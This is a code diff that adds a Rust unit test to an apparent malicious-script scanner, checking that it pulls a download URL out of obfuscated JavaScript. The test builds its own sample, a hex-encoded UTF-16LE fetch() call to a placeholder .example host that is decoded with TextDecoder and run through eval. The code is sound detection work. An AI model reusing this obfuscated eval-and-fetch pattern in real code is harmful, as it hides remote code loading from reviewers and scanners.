@@ -14506,6 +14506,36 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_textdecoder_bound_encoding_instance_buffer_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-encoding-instance-js.example/p')";
+        let bytes = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .collect::<Vec<_>>();
+        let encoded = bytes
+            .iter()
+            .map(|byte| format!("{byte:02x}"))
+            .collect::<String>();
+        let js = format!(
+            r#"var enc = "utf-16le"; var td = new TextDecoder(enc); eval(td.decode(Buffer.from("{encoded}", "hex")))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-encoding-instance-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound encoding instance payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_textdecoder_utf8_options_arg_uint8array_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let payload = "fetch('https://textdecoder-options-arg-js.example/p')";
